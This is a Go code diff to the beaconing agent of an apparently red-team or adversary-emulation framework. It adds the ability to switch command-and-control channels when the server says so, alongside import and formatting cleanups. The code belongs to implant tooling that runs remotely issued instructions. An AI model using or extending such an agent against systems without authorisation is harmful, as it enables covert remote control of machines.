@@ -6,28 +6,33 @@ import (
 	"net/http"
 	"os"
 	"os/user"
+	"path/filepath"
 	"reflect"
 	"runtime"
 	"strings"
 	"time"
-	"path/filepath"
 
 	"../contact"
 	"../execute"
-	"../util"
 	"../output"
 	"../privdetect"
+	"../util"
 )
 
-func runAgent(coms contact.Contact, profile map[string]interface{}) {
-    watchdog := 0
+func runAgent(coms contact.Contact, profile map[string]interface{}, c2 map[string]string) {
+	watchdog := 0
 	checkin := time.Now()
 	for {
 		beacon := coms.GetInstructions(profile)
 		if len(beacon) != 0 {
 			profile["paw"] = beacon["paw"]
 			checkin = time.Now()
-		} 
+		}
+		if beacon["c2"] != nil && beacon["c2"].(string) != c2["c2Name"] {
+			output.VerbosePrint(fmt.Sprintf("Switching to %s C2 Channel", beacon["c2"].(string)))
+			c2["c2Name"] = beacon["c2"].(string)
+			coms = contact.CommunicationChannels[beacon["c2"].(string)]
+		}
 		if beacon["instructions"] != nil && len(beacon["instructions"].([]interface{})) > 0 {
 			cmds := reflect.ValueOf(beacon["instructions"])
 			for i := 0; i < cmds.Len(); i++ {
@@ -104,7 +109,9 @@ func Core(server string, delay int, executors []string, c2 map[string]string, ve
 	for {
 		coms := chooseCommunicationChannel(profile, c2)
 		if coms != nil {
-			for { runAgent(coms, profile) }
+			for {
+				runAgent(coms, profile, c2)
+			}
 		}
 		util.Sleep(300)
 	}
